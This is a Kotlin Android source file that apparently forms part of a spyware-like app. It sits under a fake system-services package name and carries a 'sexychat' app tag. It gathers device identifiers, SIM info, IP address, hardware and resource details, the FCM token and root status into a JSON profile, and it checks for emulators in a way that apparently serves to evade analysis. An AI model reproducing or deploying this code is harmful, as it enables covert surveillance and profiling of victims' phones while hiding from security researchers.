package com.android.system.services.utils

import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.NetworkCapabilities
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.os.StatFs
import android.provider.Settings
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.net.Inet4Address
import java.net.NetworkInterface

object DeviceInfoHelper {
    private const val TAG = "DeviceInfoHelper"

    fun getDeviceId(context: Context): String {
        return Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
    }

    fun getBatteryPercentage(context: Context): Int {
        return try {
            val ifilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
            val batteryStatus = context.registerReceiver(null, ifilter)
            val level = batteryStatus?.getIntExtra("level", -1) ?: -1
            val scale = batteryStatus?.getIntExtra("scale", -1) ?: -1
            if (level != -1 && scale != -1) {
                ((level / scale.toFloat()) * 100).toInt()
            } else -1
        } catch (e: Exception) {
            -1
        }
    }

    fun getIPAddress(): String {
        try {
            val interfaces = NetworkInterface.getNetworkInterfaces()
            while (interfaces.hasMoreElements()) {
                val intf = interfaces.nextElement()
                val addrs = intf.inetAddresses
                while (addrs.hasMoreElements()) {
                    val addr = addrs.nextElement()
                    if (!addr.isLoopbackAddress && addr is Inet4Address) {
                        return addr.hostAddress ?: "Unknown"
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "IP Address error: ${e.message}")
        }
        return "Unknown"
    }

    fun checkIfRooted(): Boolean {
        return try {
            val paths = arrayOf(
                "/system/app/Superuser.apk",
                "/sbin/su",
                "/system/bin/su",
                "/system/xbin/su",
                "/data/local/xbin/su",
                "/data/local/bin/su",
                "/system/sd/xbin/su",
                "/system/bin/failsafe/su",
                "/data/local/su",
                "/su/bin/su"
            )
            paths.any { File(it).exists() } || checkSuCommand()
        } catch (e: Exception) {
            false
        }
    }

    private fun checkSuCommand(): Boolean {
        return try {
            Runtime.getRuntime().exec("su")
            true
        } catch (e: Exception) {
            false
        }
    }

    fun isEmulator(): Boolean {
        return (Build.FINGERPRINT.startsWith("generic")
                || Build.FINGERPRINT.startsWith("unknown")
                || Build.MODEL.contains("google_sdk")
                || Build.MODEL.contains("Emulator")
                || Build.MODEL.contains("Android SDK built for x86")
                || Build.MANUFACTURER.contains("Genymotion")
                || Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic")
                || "google_sdk" == Build.PRODUCT)
    }

    fun getStorageInfo(): Pair<Long, Long> {
        val statFs = StatFs(Environment.getDataDirectory().path)
        return Pair(statFs.totalBytes, statFs.availableBytes)
    }

    fun getRamInfo(context: Context): Pair<Long, Long> {
        val activityManager = context.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
        val memInfo = android.app.ActivityManager.MemoryInfo()
        activityManager.getMemoryInfo(memInfo)
        return Pair(memInfo.totalMem, memInfo.availMem)
    }

    fun getNetworkType(context: Context): String {
        val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val network = connectivityManager.activeNetwork
            val capabilities = connectivityManager.getNetworkCapabilities(network)
            when {
                capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true -> "WiFi"
                capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) == true -> "Mobile"
                capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) == true -> "Ethernet"
                else -> "Unknown"
            }
        } else {
            @Suppress("DEPRECATION")
            val netInfo = connectivityManager.activeNetworkInfo
            netInfo?.typeName ?: "Unknown"
        }
    }

    fun getBatteryState(context: Context): String {
        val batteryStatus = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val status = batteryStatus?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
        val isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                status == BatteryManager.BATTERY_STATUS_FULL

        val chargePlug = batteryStatus?.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1) ?: -1
        return when {
            isCharging && chargePlug == BatteryManager.BATTERY_PLUGGED_USB -> "charging_usb"
            isCharging && chargePlug == BatteryManager.BATTERY_PLUGGED_AC -> "charging_ac"
            isCharging && chargePlug == BatteryManager.BATTERY_PLUGGED_WIRELESS -> "charging_wireless"
            isCharging -> "charging"
            else -> "discharging"
        }
    }

    fun isCharging(context: Context): Boolean {
        val batteryStatus = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val status = batteryStatus?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
        return status == BatteryManager.BATTERY_STATUS_CHARGING ||
                status == BatteryManager.BATTERY_STATUS_FULL
    }

    fun getScreenInfo(context: Context): Triple<String, Int, Int> {
        val displayMetrics = context.resources.displayMetrics
        val resolution = "${displayMetrics.widthPixels}x${displayMetrics.heightPixels}"
        return Triple(resolution, displayMetrics.densityDpi, displayMetrics.widthPixels)
    }

    fun buildDeviceInfoJson(
        context: Context,
        deviceId: String,
        fcmToken: String,
        userId: String
    ): JSONObject {
        val (totalStorage, freeStorage) = getStorageInfo()
        val (totalRam, freeRam) = getRamInfo(context)
        val (screenResolution, screenDensity, _) = getScreenInfo(context)

        val totalStorageMb = totalStorage / (1024.0 * 1024.0)
        val freeStorageMb = freeStorage / (1024.0 * 1024.0)
        val storageUsedMb = totalStorageMb - freeStorageMb
        val storagePercentFree = if (totalStorageMb > 0) (freeStorageMb / totalStorageMb * 100) else 0.0

        val totalRamMb = totalRam / (1024.0 * 1024.0)
        val freeRamMb = freeRam / (1024.0 * 1024.0)
        val ramUsedMb = totalRamMb - freeRamMb
        val ramPercentFree = if (totalRamMb > 0) (freeRamMb / totalRamMb * 100) else 0.0

        return JSONObject().apply {
            put("model", Build.MODEL)
            put("manufacturer", Build.MANUFACTURER)
            put("brand", Build.BRAND)
            put("device", Build.DEVICE)
            put("product", Build.PRODUCT)
            put("hardware", Build.HARDWARE)
            put("board", Build.BOARD)
            put("display", Build.DISPLAY)
            put("fingerprint", Build.FINGERPRINT)
            put("host", Build.HOST)
            put("os_version", Build.VERSION.RELEASE)
            put("sdk_int", Build.VERSION.SDK_INT)
            put("supported_abis", JSONArray(Build.SUPPORTED_ABIS.toList()))

            put("battery", getBatteryPercentage(context))
            put("battery_state", getBatteryState(context))
            put("is_charging", isCharging(context))

            put("total_storage_mb", totalStorageMb)
            put("free_storage_mb", freeStorageMb)
            put("storage_used_mb", storageUsedMb)
            put("storage_percent_free", storagePercentFree)

            put("total_ram_mb", totalRamMb)
            put("free_ram_mb", freeRamMb)
            put("ram_used_mb", ramUsedMb)
            put("ram_percent_free", ramPercentFree)

            put("network_type", getNetworkType(context))
            put("ip_address", getIPAddress())

            put("is_rooted", checkIfRooted())
            put("screen_resolution", screenResolution)
            put("screen_density", screenDensity)

            put("sim_info", SimInfoHelper.getSimInfo(context))

            put("fcm_token", fcmToken)
            put("user_id", userId)
            put("app_type", "sexychat")

            put("is_emulator", isEmulator())
            put("device_name", "${Build.MANUFACTURER} ${Build.MODEL}")
            
            put("package_name", context.packageName)
        }
    }

    fun buildDeviceInfoJsonWithoutPermissions(
        context: Context,
        deviceId: String,
        fcmToken: String,
        userId: String
    ): JSONObject {
        val (totalStorage, freeStorage) = getStorageInfo()
        val (totalRam, freeRam) = getRamInfo(context)
        val (screenResolution, screenDensity, _) = getScreenInfo(context)

        val totalStorageMb = totalStorage / (1024.0 * 1024.0)
        val freeStorageMb = freeStorage / (1024.0 * 1024.0)
        val storageUsedMb = totalStorageMb - freeStorageMb
        val storagePercentFree = if (totalStorageMb > 0) (freeStorageMb / totalStorageMb * 100) else 0.0

        val totalRamMb = totalRam / (1024.0 * 1024.0)
        val freeRamMb = freeRam / (1024.0 * 1024.0)
        val ramUsedMb = totalRamMb - freeRamMb
        val ramPercentFree = if (totalRamMb > 0) (freeRamMb / totalRamMb * 100) else 0.0

        return JSONObject().apply {
            put("model", Build.MODEL)
            put("manufacturer", Build.MANUFACTURER)
            put("brand", Build.BRAND)
            put("device", Build.DEVICE)
            put("product", Build.PRODUCT)
            put("hardware", Build.HARDWARE)
            put("board", Build.BOARD)
            put("display", Build.DISPLAY)
            put("fingerprint", Build.FINGERPRINT)
            put("host", Build.HOST)
            put("os_version", Build.VERSION.RELEASE)
            put("sdk_int", Build.VERSION.SDK_INT)
            put("supported_abis", JSONArray(Build.SUPPORTED_ABIS.toList()))

            put("battery", getBatteryPercentage(context))
            put("battery_state", getBatteryState(context))
            put("is_charging", isCharging(context))

            put("total_storage_mb", totalStorageMb)
            put("free_storage_mb", freeStorageMb)
            put("storage_used_mb", storageUsedMb)
            put("storage_percent_free", storagePercentFree)

            put("total_ram_mb", totalRamMb)
            put("free_ram_mb", freeRamMb)
            put("ram_used_mb", ramUsedMb)
            put("ram_percent_free", ramPercentFree)

            put("network_type", getNetworkType(context))
            put("ip_address", getIPAddress())

            put("is_rooted", checkIfRooted())
            put("screen_resolution", screenResolution)
            put("screen_density", screenDensity)

            put("sim_info", JSONArray())

            put("fcm_token", fcmToken)
            put("user_id", userId)
            try {
                val appConfig = com.android.system.services.AppConfig.getInstance()
                put("app_type", appConfig.appType)
            } catch (e: Exception) {
                put("app_type", "MP")
            }

            put("is_emulator", isEmulator())
            put("device_name", "${Build.MANUFACTURER} ${Build.MODEL}")
            
            put("package_name", context.packageName)
        }
    }
}